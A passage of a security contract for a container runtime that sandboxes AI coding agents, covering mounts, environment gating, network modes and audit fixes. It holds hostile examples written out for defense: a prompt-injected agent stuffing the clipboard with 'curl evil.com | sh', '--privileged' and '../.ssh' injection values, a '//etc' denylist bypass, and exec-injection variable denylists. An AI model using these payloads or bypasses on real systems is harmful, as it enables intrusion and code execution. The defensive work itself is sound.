# Capability Surface Inventory

Everything the runtime exposes to an in-container agent, with
justification. This file is a **contract**, not documentation: when
the code changes the surface, this file changes too, in the same
commit.

**What is mechanically checked.** Tests assert the standing negatives — that a
rendered session binds no state-root umbrella, no docker socket, no ssh agent,
and no other agent's credential directory — and that this file keeps its
required sections. The mount and environment TABLES below are maintained by
hand and are not diffed against a rendered session; that check is planned. A row
that does not match what botainer actually does is a bug — please report it
(see [`SECURITY.md`](../SECURITY.md)).

> **What is here, and what is not.** This page is the CONTRACT: what the runtime
> exposes today, and why each grant is the minimum needed. The HISTORY — how each
> piece came to be this way, which audit round found what — is a maintainer's
> register and is not distributed. Every entry in it is still listed at the end
> of this page by id and title, so a `§4x` reference anywhere in the codebase
> resolves; only the long form is absent, and nothing above depends on it.
>
> Where a decision has a longer internal derivation, it is cited as
> `internal design note DN-###` rather than as a file path. That is deliberate:
> a path would be a dead end for you, it rots when the file moves, and a
> filename can disclose something before you have read a word. The id is clear
> instead — there IS more, you do not have it, and nothing pretends to be a link
> you can follow. Every claim about the capability surface is stated in full on
> this page or verifiable against the shipped code.

This exists because of the umbrella-bind disaster (see
internal design note DN-003): a CRITICAL security
regression slipped through because the codebase had stated principles
but no enforcement. The inventory is the enforcement.

## Why this is structured the way it is

Each entry has:
- **What** — the binding/env-var/socket/whatever, in concrete form
- **Where** — file:line where it's declared
- **Why** — one sentence justifying why this is the minimum needed
- **Widening checkpoint** — if this entry's scope ever increased
  (RO→RW, narrower path → broader path, optional → mandatory), the
  commit that widened it should be linked here so a future reviewer
  can ask "what stopped working at the narrower scope?"

Mounts are listed in the order the launcher applies them. Order
matters for shadowing.

### Mounts always present (core base)

| Target inside container | Source on host | Mode | Why |
|---|---|---|---|
| `/workspace` | project root | rw | The agent's working directory. Project files are the unit of interaction. |
| `/workspace/.botainer` | `<state_root>/state/<uuid>/data/null-bind-anchor` | null-bind (empty) | Hide everything in the project's local `.botainer/` from the agent unless explicitly nested-bound on top. Prevents leakage of project-local secrets/config the user dropped into that dir. |
| `/workspace/.botainer/AGENT_ACCESS.txt` | `<state_root>/state/<uuid>/sessions/<sid>/AGENT_ACCESS.txt` | ro | Per-session summary of what the agent can do, generated by the launcher. Nested on top of the null-bind. |
| `/workspace/.botainer/AGENT_HINTS.md` | `<state_root>/state/<uuid>/sessions/<sid>/AGENT_HINTS.md` | ro | Launcher-composed prompt-priming text. Nested on top of the null-bind. |
| `/packages` | `<state_root>/state/<uuid>/packages` | rw | Per-project persistent package installs (pip/conda/julia etc.). Survives session restart. |
| `/scratch` | `<state_root>/state/<uuid>/scratch` | rw | Per-project ephemeral scratch. Agent shouldn't store load-bearing state here. **Ephemeral by CONVENTION, not by mechanism** (corrected): the source is under the state root (default `~/.botainer`), so *nothing deletes it* — not botainer, not the cluster. `scratch.template` in a cluster profile names the site's purged filesystem but is display-only and is never a bind source. The purge claim in AGENT_HINTS + the session-start summary is therefore derived from the real bind path (`agent_hints.cluster_purge_prefix`) and appears ONLY when the source is genuinely under that filesystem; unknown never renders as "purged". Deleting this dir is safe — the next launch recreates it (observed, not inferred). |
| `/home/user` | `<state_root>/state/<uuid>/home` | rw | **Writable HOME** (`HOME=/home/user`). The container runs as the host uid, which has no home in the image → `HOME=/` (unwritable) → npm/npx/pip and Claude Code break or spill into `/tmp`. This is an EMPTY botainer-owned dir (NOT the host home — `--no-home` / host-home-inaccessible is preserved). Holds only tool config/caches (`~/.npmrc`, `~/.cache`, `~/.gitconfig`). Agent-writable persistent state, same trust class as `/packages`; the dotfile-persistence surface it adds already exists via `/packages` (on `PYTHONPATH`/`NODE_PATH`), and the entrypoint does not source `~/.bashrc`. `HOME` is a `_BOTAINER_MANAGED_ROUTES` var so a git-shared config can't redirect it. NEVER reaches the login container or an HPC child job (separate code paths; child jobs additionally denylist `/home`). Fable-5 reviewed. |

> **`/tmp` + `/var/tmp` are ephemeral tmpfs (docker), not binds.**
> The docker adapter mounts `--tmpfs /tmp:rw,exec,nosuid,nodev,mode=1777` (and
> `/var/tmp`). No host path is exposed — it's RAM-backed, empty at start, cleared
> when the container stops. Rationale: the container runs as a homeless uid, so
> runtime temp (Claude Code's `/tmp/claude-<uid>`, pip/npm build temp) lands in
> `/tmp`; on the container writable layer that consumes the Docker VM disk and
> ENOSPCs when it's full. tmpfs keeps temp off the VM disk and self-cleaning
> (never accumulates like a persistent dir). Self-bounds by the container memory
> limit / VM RAM; a runaway temp write OOM-kills only this container. `exec`
> allowed (pip/npm native builds + chromium run helpers from `/tmp`). HPC/apptainer
> already gets a private `/tmp` from `--containall` — this is the docker peer.
>
> **Docker-disk guidance (surface-neutral — no capability change).**
> `docker run -d` launch failures containing "no space left on device" now append
> plain remediation (`docker builder prune -af` — build cache, keeps images; NOT
> `docker system prune -a`, whose `-a` deletes the built agent image / Docker
> Desktop → Settings → Resources → Disk; the Docker VM disk is separate from the
> Mac's free space).
> `botainer doctor` gained a `runtime.docker_disk` check (parses `docker system
> df`; WARN when >= 3 GB is reclaimable). Message/diagnostic only — no new bind,
> env, or exposure.
>
> **Change note (host-test — null-bind anchor auto-reset):**
> the null-bind masking dir's invariant is "empty at compose time." Task #200
> previously REFUSED when it was populated (leftover mask-writes from a prior
> crashed session persist because data_dir is on $HOME) — which blocked every
> normal user after their first crash and exposed an internal path name. Now
> botainer RESETS the dir itself (it owns it; the real agent/plugin data lives in
> sibling `data_dir/<name>/`, never inside the anchor; the launch-time nested
> placeholders are recreated). This STRENGTHENS the original threat model (an
> attacker-dropped file is deleted before launch, not merely alarmed about) while
> removing the user-hostile refusal. Fail-closed only if the reset itself fails.
> No inventory rows change. Pinned by
> `test_session_smoke_with_mock.py::test_populated_null_bind_anchor_is_reset_not_refused`.

Source: `plugins/hpc-launcher/host_helper/_common.py::SubmissionPlan.to_apptainer_argv`

### Runtime hardening flags (must match the direct adapter — §4 parity)

`apptainer exec --containall --cleanenv --no-privs --drop-caps all`. This is the
**product** cage: the sbatch path builds its own argv and BYPASSES
`ApptainerAdapter` (the inner `botainer start --in-container` skips the runtime
adapter), so the adapter's hardening does NOT apply here — it is repeated
verbatim. `--containall` = own user/mount/pid/ipc ns + minimal /dev + empty
home/tmp; `--cleanenv` strips the host env (re-injected selectively via `--env`);
`--no-privs` sets `PR_SET_NO_NEW_PRIVS=1`; `--drop-caps all` drops all kernel
caps. The last two are **load-bearing under setuid-mode apptainer**
(`AllowSetuid:true`, the target-cluster mode); without them the compute-node
cage silently loses NoNewPrivs + caps=0. Pinned by
`tests/integration/test_principle_enforcement.py::test_principle_hpc_sbatch_cage_carries_hardening`
+ `tests/unit/test_hpc_launcher.py` (S2 / HPC-audit §4 regression,:
these were present on the adapter but absent here; the old principle pin tested
only the bypassed adapter). No escape-hatch flag (`--fakeroot` / `--writable` /
`--add-caps` / `--keep-privs` / `--allow-setuid`) is ever emitted. The cage also
NEVER binds the Slurm auth/spool sockets (`/run/munge`, `/etc/munge`,
`/var/spool/slurmd`) — pinned by
`test_hpc_launcher.py::test_to_apptainer_argv_never_binds_munge_or_slurmd`
(Finding-4 DiD).

**Plugin-contributed RO overlays are NOT routed onto this cage (H2/#160).**
Unlike the docker/direct path, `to_apptainer_argv` carries only core binds +
the hpc-modules software-root binds (§4h) — it does NOT apply plugin
`pre_session` bind contributions (the inner `--in-container` launcher computes
them but can't add binds post-launch). Concretely, the **git guarded-mode**
`.git/hooks` + `.git/config` **read-only overlay is absent on HPC** (its
dangerous-key session REFUSAL still runs, catching a repo that already carries
host-exec keys, but a mid-session write to `.git` is not frozen). `botainer hpc
submit` emits a precise "GIT PARTIALLY PROTECTED (HPC)" consent warning rather
than implying the overlay applies. Real fix (route these onto the outer argv,
mirroring `derive_software_root_binds`) is tracked in
internal design note DN-005 (S2 / HPC-audit Finding 5).

## 2a. Login containers (one-shot OAuth container)

The `botainer auth login --agent claude` flow uses a **separate**,
short-lived container that is NOT a botainer session. Its surface
is documented here because it touches the same trust boundaries
(binds, env-var propagation) and is in scope for the
"Capability surface is contract" rule.

Source: `plugins/agent-claude-shared/hooks/login.py` (`build_docker_argv`,
`build_apptainer_argv`, `build_apptainer_subenv`) and the structurally
identical `plugins/agent-claude/hooks/login.py` (isolated mode).
Both surfaces are pinned by
`tests/integration/test_login_container_surface.py`.

Per the HPC-parity rule (apptainer is a first-class peer to docker),
the apptainer path is documented first; docker is the analog.

### 2a.1 Apptainer login container

#### Mounts

| Target | Source on host | Mode | Why |
|---|---|---|---|
| `/out` | shared mode: `<state_root>/shared-auth/agent-claude` | rw | The OAuth credential lands here. RW because Claude Code writes `.credentials.json` mid-flow. **Only the active agent's subdir** — no other agents' creds, no umbrella bind. |
| `/out` | isolated mode: `<state_root>/state/<uuid>/data/agent-claude/profiles/<profile>` | rw | Same, but per-project. |

No other mounts. No `--bind` for `/workspace`, `/packages`,
`/scratch`, etc. — the login container is single-purpose. **The
apptainer argv carries `--no-home` explicitly** because some apptainer versions still bind `$HOME` under
`--containall`; without `--no-home` the "no other mounts" promise
above would not hold across versions. Pinned by
`test_apptainer_argv_carries_no_home`.

**`.sif` integrity guards** (M2, landed): the login hook
locates the `.sif` via `_resolve_apptainer_sif` which refuses any
candidate that (a) is a symlink (would let an attacker redirect
`apptainer exec` to a chosen file processed AS the calling user),
(b) is not owned by the current user (someone else's image processing
your OAuth token), or (c) is group- or world-writable (any co-tenant
could swap the image between rebuild and login). Pinned by
`test_resolve_apptainer_sif_refuses_{symlink,group_writable}`.

**`MY_BOTAINER` syntax** (M3, landed): the login hook
validates `MY_BOTAINER` with the same character-class +
`..`-traversal checks as `botainer/state/dir.py`. Closes the
sibling-path asymmetry where a direct hook invocation (not via
`botainer auth login`) was previously unvalidated. Drift-pinned
against the launcher regex by
`test_validated_state_root_matches_launcher_regex`.

**Ancestor-symlink refusal** (M4, landed): before the
credential-dir `mkdir(parents=True)`, `_refuse_symlink_in_ancestry`
lstat-walks every existing ancestor up to the validated state root
and refuses on any symlink. Without this, an attacker who controls
a parent dir as a symlink could redirect where the credential file
lands (the `mkdir -p` would follow the symlink).

#### Env vars injected (because `--cleanenv` strips all)

Passed via `APPTAINERENV_*` / `SINGULARITYENV_*` prefix env vars in
the parent process environment (portable across apptainer 1.x and
older singularity 3.x — the `--env KEY=VAL` flag is apptainer 1.0+
and not on all cluster installs).

| Var inside container | Value | Why |
|---|---|---|
| `CLAUDE_CONFIG_DIR` | `/out` | Tells Claude Code to write its config (including `.credentials.json`) into the bound host dir, not into `$HOME/.claude/` which would be ephemeral. |

**Important: `--cleanenv` is real only if the parent env doesn't
have stray `APPTAINERENV_*`/`SINGULARITYENV_*` vars from the user's
shell.** `build_apptainer_subenv` strips both prefixes from
`os.environ` before adding our two explicit vars. A parent-shell
`APPTAINERENV_FOO=bar` does NOT leak into the container.

#### File-mode handling

The container command is wrapped: `sh -c 'umask 0077 && exec claude'`.
This sets the file-creation mode to `0600` BEFORE `claude` runs, so
the credential file lands at `0600` on the host even if the user
takes minutes to complete the OAuth flow. The host-side `chmod 0600`
after exit is defense-in-depth, not the primary protection.

(The earlier `UMASK=077` env-var approach relied on Claude's entrypoint
reading `$UMASK` — not contractually guaranteed.)

#### Network

Apptainer shares the host's network namespace by default (unlike
Docker). No `--net` or `--network=none` flag. Justified because
Claude's OAuth flow needs to listen on a localhost callback port
that the user's browser will connect to (potentially via SSH tunnel
on HPC compute nodes).

### 2a.2 Docker login container

The docker analog. Same surface model, with docker-specific syntax
(`-v` for binds, `-p` for port publish).

#### Mounts

| Target | Source on host | Mode | Why |
|---|---|---|---|
| `/out` | shared / isolated (same paths as above) | rw | Same purpose; only the syntax differs. `docker -v <src>:/out`. |

#### Env vars injected

| Var | Value | Why |
|---|---|---|
| `CLAUDE_CONFIG_DIR` | `/out` | Same as apptainer. Passed via `docker -e`. |

#### File-mode handling

Same `sh -c 'umask 0077 && exec claude'` wrapper as the apptainer
path. No `UMASK=077` env var.

#### Network

Docker publishes `127.0.0.1:54545-54549:54545-54549` (overridable
via `BOTAINER_LOGIN_PORT_LO/HI`) so the OAuth callback URL can
reach Claude inside the container. **Always loopback** — never
`0.0.0.0`. On a multi-user host, the published ports are still
reachable by other tenants of the same host's loopback; the
sharp-edges H2 finding from the review tracks this as a
deferred risk, tracked internally as "multi-tenant docker login".

### What login containers are NOT

- **Not a botainer session.** No `/workspace`, no project state, no
  agent prompt-priming files.
- **Not persistent.** `--containall` + one-shot exec / `--rm` means
  the filesystem is reset on every run; only the bound `/out` dir
  survives.
- **Not exempt from the host-Keychain promise.** The container
  cannot reach the host's macOS Keychain, `~/.claude/`, or
  `~/.config/anthropic/`. The credential lives ONLY in the bound
  `/out` dir. All four code paths (docker|apptainer × shared|isolated)
  must state this promise to the user — pinned by `_format_login_help`
  in both login.py files.

## 4. Network

| Mode | What the agent can reach |
|---|---|
| `network.mode: none` | Loopback only. No DNS. No external network. |
| `network.mode: internet` | Unrestricted egress. Inbound only via explicit `web-ports` plugin port forwards **or** the browser viewer's noVNC port when `plugins.browser.viewer: true` (docker only). |
| `network.mode: endpoint-ip-allowlist` | Egress only to IPs derived from a configured endpoint list (HTTPS hostnames resolved at session start). NOTE: refused at compose in v0.1 (#176; enforcement retired) — listed for completeness. |

Inbound: never, except two explicit, docker-only, loopback-only (`host_bind:
127.0.0.1`) grants, both minted in `composition._resolve_port_forwards`:
1. the `web-ports` plugin's configured `ports:` (a general web-app forward), and
2. the browser viewer's noVNC port (container 6080 → an auto-picked free host
   port) when `plugins.browser.viewer: true` — `viewer: true` IS the grant.
On **apptainer** neither is added: the adapter refuses `port_forwards` outright,
and the browser viewer is reached over a node-local `0700` unix socket + `ssh -L`
instead of a published port (see §4av). `network.mode: none` + any forward is
refused (a forward needs a netns).

**Apptainer cannot enforce `none`/`endpoint-ip-allowlist` (audit T4).** Apptainer
shares the host network namespace, so those modes are **refused** rather than
silently run on the host network — by the apptainer adapter (`validate`) on the
direct path AND by `cli/start.py` on the sbatch `--in-container` path (which
skips the adapter; both now agree). On apptainer you get `internet` (host
network) or you refuse; true isolation needs cluster-side namespaces (`unshare
-n`, future). Docker enforces all modes.

**Site-policy ceiling is enforced (AUDIT H4).** The project's
`network.mode` comes from the git-shareable (attacker-influenceable)
`.botainer/config.yaml`. `compose_session` now refuses a project mode **less
restrictive than** `effective_policy.network.default_mode` — the ceiling the
root-owned `/etc/botainer/policy.yaml` (intersected with user policy)
declares, ordered `none < endpoint-ip-allowlist < internet`. Previously the
ceiling was computed but never consulted, so a tampered config requesting
`internet` was accepted even under a `none` site ceiling (fail-open egress).
The ceiling **defaults to `internet`** (no restriction when no admin policy is
deployed — laptop dev); a multi-tenant HPC admin **lowers** it to bind. The
project config may only request a mode **at or below** the ceiling.

**HPC parity (same commit):** on the apptainer compute-node path the session
runs under `apptainer exec --containall`, so the container's `/etc` shadows the
host's and `/etc/botainer/policy.yaml` would be invisible — the ceiling would
silently fall back to the default. The hpc-launcher host_helper therefore binds
the host site policy into the container (read-only, at a state-root-relative
path) and sets `BOTAINER_SITE_POLICY`, which `load_site_policy()` consults
first. So an admin's lowered ceiling is enforced by the inner `compose_session`
on the compute node exactly as on docker — not just on the dev-scaffold path.
The override is honored **only if the file is root-owned** (`os.environ` is
user-controlled on the direct path; a bind preserves the host file's uid, so
the legitimate root-owned site policy passes while a user's own file is
ignored — closing a ceiling-bypass on shared hosts).

## 4a. Channels we know about but do NOT actively gate

These are paths from inside the container that reach the user's
environment, but we don't try to block them in-runtime. The defense
lives elsewhere (user's terminal config, OS opt-ins). Documented
here so future reviewers know the threat model.

### OSC 52 — clipboard write via stdout escape sequence

The agent inside the container writes to stdout. stdout reaches the
user's terminal (directly for docker, via SSH + apptainer's pty for
HPC). If the agent emits an OSC 52 escape sequence
(`\033]52;c;<base64>\007`), and the terminal interprets it AND has
clipboard-access enabled, the user's OS clipboard is updated.

**Threat**: an agent following malicious instructions in its
context window can do "clipboard stuffing" — set the user's
clipboard to `curl evil.com | sh` or similar. User pastes from
clipboard expecting their last copied text, gets the attacker's
payload.

**Why we don't actively block it**:
- Stripping OSC 52 from container stdout requires intercepting
  every byte the agent writes; expensive, fragile, defeats
  legitimate uses (e.g. plugin-supplied scripts that talk to the
  terminal).
- The defense is well-understood at the terminal layer: every
  modern terminal that supports OSC 52 also has an explicit
  opt-in toggle. iTerm2 defaults to OFF. Apple Terminal.app
  defaults to OFF in recent versions. Windows Terminal: same.
- This isn't botainer-specific; it's the standard terminal
  security model.

**What we DO do**:
- We do NOT ship a `clip`/`pbcopy`-style helper script inside
  the container that makes emitting OSC 52 easier. The agent
  has to construct the escape bytes itself, which is more
  unusual behavior and easier to spot in audit/logs.
- We document the recommended user posture (keep terminal
  clipboard-access OFF) in the security docs.

**Reviewer checklist** (for any commit touching agent images,
entrypoint wraps, or anything else the agent might exec):
- Does this introduce a helper that writes to `/dev/tty` or emits
  escape sequences? If yes, justify why.
- Does this make clipboard-write easier than "construct OSC 52 by
  hand"? If yes, this is a capability surface change and needs
  review.

### Terminal escape sequences in general

Similar shape applies to other terminal escape sequences — title
setting (OSC 0/2), hyperlink emit (OSC 8), bell, cursor
positioning, scroll region manipulation. None are actively gated.
Defense is at the terminal layer + user awareness.

We may revisit if a class of attack via terminal escapes becomes
the dominant vector in agent security research.

## 4b. Image reference is content-validated (argv-injection defense)

The image lands as a **positional** on `docker run … <image>` /
`apptainer exec … <image>`. `docker run` has no `--`-before-image
convention, so a leading-dash value is parsed as a *flag*:
`image: "--privileged"` (with a second entrypoint_wrap present — the
normal proxy/shared agent layout) yielded a **privileged container that
defeated `--cap-drop ALL` + `--security-opt no-new-privileges`**
(CRITICAL, found by the AC7 hole-hunt).

Defense: `botainer.core.spec.validate_image_reference` rejects an empty
image, a leading `-`, or any NUL/newline/CR/tab/space — enforced as a
`SessionSpec.image` field validator (type-level chokepoint for *every*
construction path) and surfaced as `IMAGE_INVALID` at compose time
(`_resolve_session_image`).

HPC parity (closed): the hpc-launcher host_helper carries an
inlined mirror (`_reject_flaglike_image`). It was previously applied
only to the two *config*-sourced resolver branches, leaving the
`botainer hpc --image <flag>` CLI override (merged onto the frozen plan
via `plan.__class__(**{**plan.__dict__, **overrides})` in `submit.py`)
unvalidated — the same flag-injection vector, reaching `apptainer exec
<image>` in all three modes (submit/here/attach). It is now enforced in
`SubmissionPlan.__post_init__`, making the frozen dataclass the
universal chokepoint on the HPC side (mirrors the `SessionSpec.image`
field validator): make_plan, the override merge, the auto-yes rebuild,
and tests all validate. Generated `.sif` paths (the resolver's
filename/recorded candidates, after the two config-sourced branches) are
absolute and pass cleanly.

The image is NOT otherwise free-form: it must be an OCI reference or an
absolute `.sif` path. Two image-positional hardenings ride alongside the
content validator (AC7 review; both robustness, not
escalations): the docker `--entrypoint` splice locates the image at its
known last-token position rather than `argv.index(spec.image)` (which
would mis-place it if the image string equalled an earlier arg such as
`/workspace`); and the apptainer `cfg.image` acceptance requires an
absolute `is_file()` (a `.sif`) **or** `is_dir()` (a sandbox), not a
bare `exists()`, so a `/dev/zero`-style device/FIFO/socket is rejected.

Note: the argv-separator gate could not have caught this —
it inspects inline `"docker", …` argv literals, not a positional
appended as `argv += [spec.image]`. The content validator, not the
separator gate, is the defense for the image positional.

## 4c. Project UUID is content-validated (sbatch-script-injection defense)

`project_uuid` originates from `.botainer/project-id` — a host-side,
**git-shareable** file (a malicious clone/fork/co-commit is an attacker
vector). On the HPC submit path it is interpolated **unquoted** into the
generated sbatch script (`# project_uuid: …`, `#SBATCH --job-name=…`,
`#SBATCH --output=…/<uuid>/…`), which `sbatch` then runs as bash on the
login/compute node. A newline therefore injected arbitrary `#SBATCH`
directives and shell lines that ran as the user (**HIGH**, AC7
validator-parity audit). The hole was that `botainer hpc
submit` reached `SubmissionPlan` via the generic plugin dispatcher
(`read_project_id` → `BOTAINER_PROJECT_UUID` env → `make_plan`) and
**never** ran `identity._validate_uuid` — the `_SAFE`-regex newline guard
in `render_sbatch_script` covered only partition/account/gpu_type.

Defense (three chokepoints, mirroring the image fix):
- **Source:** the plugin command dispatcher
  (`botainer/plugins/manifest.py`) validates the project-id via
  `identity._validate_uuid` before exporting `BOTAINER_PROJECT_UUID`, so
  no plugin subprocess ever receives a non-canonical uuid.
- **HPC chokepoint:** `SubmissionPlan.__post_init__` rejects any
  non-canonical (non-empty) `project_uuid` (standalone-mirror of
  `identity._validate_uuid`); `project_uuid` is also added to the
  `render_sbatch_script` `_SAFE` loop as defense-in-depth at the sink.
- **Type-level:** a `SessionSpec.project_uuid` field_validator
  (`validate_project_uuid`) rejects the NUL/newline/CR/tab injection
  charset on every construction path (placeholder ids still allowed; the
  canonical-UUID grammar is enforced at the sources above, not here).

## 4d. Agent + profile names are content-validated (apptainer --bind traversal defense)

`agent` and `profile` both originate from the **git-shareable**
`.botainer/config.yaml` (attacker-influenceable). On the HPC submit path
they are interpolated into apptainer `--bind` **source/target** paths and
an on-host `mkdir(parents=True)` + `chmod 0o700`:
`<state>/state/<uuid>/data/agent-<agent>/profiles/<profile>` → `/home/agent/.<agent>`
and `<state>/shared-auth/agent-<agent>` → `/shared-auth/agent-<agent>`, all
**read-write**. This standalone `host_helper` path does **not** run
`validate_mount_plan`, so its `~/.ssh`/`/etc` source denylist + realpath
guard never fire here.

- **`agent` (CRITICAL, AUDIT C1):** `botainer hpc
  submit/attach/here` never builds a `ProjectConfig`, so `config.py`'s
  `agent:` field_validator was bypassed; `_load_agent_name` returned the raw
  string and a value like `claude/../../../../.ssh` traversed out of the
  per-agent dir into an arbitrary host directory bound read-write into the
  compute-node container. Closed with the same multi-layer chokepoint as the
  image/uuid sinks: `_reject_traversal_agent` (reject `/`, `..`, leading `-`,
  whitespace/control chars) in **`SubmissionPlan.__post_init__`** (universal
  for make_plan + the `--agent` override merge + the auto-yes rebuild) AND at
  the source **`_load_agent_name`**, mirroring `config.py._validate_agent`.
- **`profile` (HIGH sibling, caught by the C1 adversarial review):** the same
  RW per-agent bind source + mkdir/chmod uses `profile` as a path component,
  validated at no chokepoint (`SubmissionPlan(profile='../../../../tmp/X')`
  normpath-collapsed to `/tmp/X`). Today `profile` arrives via
  `BOTAINER_PROFILE` (operator-trust env), not the repo, so it was latent —
  but `ProjectConfig.profile`/`SessionSpec.profile` had **no** validator and
  the path is one wiring change from a git-shareable config field. Closed at
  every layer: `validate_profile_name` (charset `^[a-z][a-z0-9_-]{0,31}$`) as
  a **`ProjectConfig.profile`** and **`SessionSpec.profile`** field_validator,
  an inlined mirror in **`SubmissionPlan.__post_init__`**
  (`_reject_unsafe_profile`), and the CLI sources (`start --auth-profile`
  already had `_PROFILE_RE`; `auth login --profile` now validated too).

## 4e. Lmod bootstrap is operator-sourced, never project config (RCE defense)

The hpc-modules `host_pre_launch` hook `source`s an Lmod bootstrap script in
a bash shell on the node. It previously read that path from
`plugins.hpc-modules.bootstrap_script` in the **git-shareable**
`.botainer/config.yaml`, so a malicious clone could point it at any file and
**run arbitrary code as the user** (CRITICAL, AUDIT C2).

Defense: the `bootstrap_script` config key is **removed** (the manifest's
`additionalProperties:false` now hard-refuses it at compose). The path is
resolved only from operator/host sources:

  - **`BOTAINER_LMOD_BOOTSTRAP`** — operator-override env, allowlisted in
    `botainer/plugins/hooks.py` so it survives the hook env scrub.
  - **Auto-populated from `~/.botainer/cluster.yaml`'s `lmod.bootstrap:`
    field** (cluster-ease C2, landed in
    `botainer/plugins/hooks.py::_scrubbed_host_env`). The launcher
    reads the active host-private cluster profile (NOT the git-shareable
    `.botainer/config.yaml`) and propagates `prof.lmod_bootstrap` into
    the hook env when the operator didn't export `BOTAINER_LMOD_BOOTSTRAP`
    explicitly. Operator env wins on conflict. The C2 trust anchor is
    preserved: the source must still be operator/host (not project).
  - **`_detect_bootstrap()`** — host login env (`LMOD_PKG`/`LMOD_CMD` +
    canonical install paths) as the final fallthrough.

Whatever source resolves the path is validated by `_reject_unsafe_bootstrap`
(absolute, existing regular file, not world-writable) before sourcing.

## 4f. Mount target/source paths are slash-normalized (denylist-bypass defense)

The mount denylist (`DENYLISTED_TARGETS`/`DENYLISTED_SOURCES`, e.g. `/etc`,
`/proc`, `~/.ssh`, the docker socket) is a `startswith` prefix match against
the **normalized** bind path. `PurePosixPath` **preserves a leading `//`**
(POSIX implementation-defined), so `//etc/passwd` previously survived
normalization unchanged: `_target_is_denied("//etc/passwd")` returned `False`
(it doesn't start with `/etc`) while docker/apptainer/the kernel mount it as
`/etc/passwd` — a **denylist bypass** (HIGH, AUDIT H3). It mattered
most for **plugin** binds, which skip the policy allowlist, leaving the
denylist as their only backstop.

Defense (`botainer/mount_plan/validation.py::_normalize_path`): collapse
redundant `/` runs to a single `/`. A non-canonical input (`//etc`, `/a//b`,
trailing slash) then differs from its normalized form and is refused by the
canonical-form guard in `validate` (`MOUNT_PATH_NOT_NORMALIZED`,
**fail-closed**) — which runs **before** the plugin-contribution branch, so it
covers plugin binds too; the denylist also now matches the collapsed form.
Legitimate single-slash paths are unchanged (no false-reject).

## 4g. host_pre_launch env_file channel (env crossing --cleanenv, gated)

A plugin's `host_pre_launch` hook (today only **hpc-modules**) may return an
`env_file` path. The launcher records it on `spec.env_files`, and it is applied
to **container env** via `--env-file` by the docker adapter, the apptainer
adapter (**after `--cleanenv`**, so it is a real cross-`--cleanenv` channel),
**and** the HPC `start --in-container` path. This channel was previously
**undocumented and unvalidated**: the file's contents were passed verbatim and
a code comment promised a containment check that didn't exist (HIGH/MEDIUM,
AUDIT H1; the sbatch path also silently dropped it — H2).

Gate (`botainer/core/composition.py::run_host_pre_launch_hooks` +
`_validate_host_env_file`), enforced for **every** plugin (the contributing
plugin's own self-filtering is not trusted):

- **Path containment** — the `env_file` must `resolve()` under
  `spec.state_dir` (the hook writes it to `BOTAINER_SESSION_SCRATCH`); a path
  outside is refused (no `--env-file` of `/etc/*` or a co-tenant file).
- **Execution-injection refusal** — any key in `_HOST_ENVFILE_EXEC_INJECTION`
  (LD_PRELOAD/LD_AUDIT/LD_PROFILE/LD_DEBUG_OUTPUT, the glibc
  GLIBC_TUNABLES/GCONV_PATH + resolver family, macOS DYLD_*, BASH_ENV/ENV/
  PROMPT_COMMAND, PERL5OPT/RUBYOPT/JAVA_TOOL_OPTIONS/_JAVA_OPTIONS/
  NODE_OPTIONS/PYTHONSTARTUP, GIT_SSH_COMMAND/GIT_CONFIG_*) is refused
  (`ENV_VAR_DENIED`). None appear in legitimate module env.
- **Non-identifier keys refused** — env names must match
  `^[A-Za-z_][A-Za-z0-9_]*$`; this rejects bash exported-function entries
  (`BASH_FUNC_<name>%%`), which a bash entrypoint would import as a
  command-shadowing shell function.
- **Credential refusal** — contents run through `credential_leak_check`
  (module env must never carry secrets).

**Launcher-enforced (updated, audit T2):** the gate now refuses, at
the LAUNCHER (not just the untrusted hook's self-filter), every
**botainer-managed package route** — `PIP_TARGET`, `PYTHONPATH`, `NODE_PATH`,
`JULIA_DEPOT_PATH`, `R_LIBS_USER`, `CONDA_ENVS_PATH`, `CARGO_HOME`, `GOPATH`,
`CLAUDE_CONFIG_DIR`, `CODEX_HOME` (`_BOTAINER_MANAGED_ROUTES`, mirroring
`load_modules.py::_BOTAINER_MANAGED`; a drift test pins them). `CODEX_HOME`
joined the set on, when agent-codex-shared started using it to locate
the credential: an env var that names where an agent reads its auth is exactly
as security-relevant as `CLAUDE_CONFIG_DIR`, and leaving it unmanaged would let
a module env-file or a git-shared `.botainer/config.yaml` point codex at an
attacker-chosen config dir — `auth.json` included. A module env-file
clobbering these would silently redirect the agent's pip/python/node/cargo/conda
routing away from `/packages/*`; that is now blocked regardless of what the hook
did. Forged-line injection (a value carrying a line boundary) is handled because
`splitlines()` splits every line boundary and EACH resulting `KEY=VALUE` line is
validated by the same gate (a forged exec-injection / managed-route / credential
line is refused); the hook additionally drops line-boundary-bearing values so
the on-disk file stays well-formed.

**Config `env:` channel parity (sharp-edges HIGH, 3 audits).** The
git-shareable `.botainer/config.yaml` `env:` is now gated by the SAME hardcoded
`_HOST_ENVFILE_EXEC_INJECTION ∪ _BOTAINER_MANAGED_ROUTES` sets, not just the
(user/site-overridable) policy `env_var_denylist` — closing the channel where an
untrusted config could set `GCONV_PATH`/`GLIBC_TUNABLES`/`HOSTALIASES` (force
code-load at container start, defeating `agent_permissions: prompt`) or
`CLAUDE_CONFIG_DIR`/`PIP_TARGET` (redirect the agent's config/package routing).
This was the most attacker-controlled of the three env channels and had only the
weaker denylist. (Pinned by `test_config_env_refuses_execinjection_and_managed_routes`.)

**Residual still deferred (caps.modules_env_override):** the gate now enforces
the effective policy `env_var_denylist` on the env-file channel too (re-audit
2), EXEMPTING only the curated module location vars (`module_binds.PATH_VARS`).
The FULL exempt set (enumerated rather than elided — re-audit round 4 #2):
`PATH`, `LD_LIBRARY_PATH`, `LIBRARY_PATH`, `CPATH`, `CMAKE_PREFIX_PATH`,
`PKG_CONFIG_PATH`, `MANPATH`, `INFOPATH` (the colon-list discovery vars) plus the
scalar module-root vars `CUDA_HOME`, `CUDA_PATH`, `MPI_HOME`, `OMPI_DIR`,
`JAVA_HOME`, `R_HOME`. **Note the `R_HOME` overlap:** `R_HOME` is ALSO on the
default `env_var_denylist` (it can redirect what R loads), yet it is exempted
here because it is a curated module-location var — so a module env-file MAY set
`R_HOME` where `cfg.env` / `pre_session` env may NOT. This residual is BOUNDED:
under `apptainer --containall` the host path `R_HOME` names is not visible unless
it is ALSO a derived software-root bind WITHIN the root-owned SitePolicy ceiling
(§4h), so a hostile modulefile cannot point R at an arbitrary unmounted host
tree — only at already-bound, ceiling-admitted software roots. So what still
flows is exactly: the enumerated location vars (incl. the `R_HOME` residual) +
any var NOT on the policy denylist and not exec-injection / managed-route /
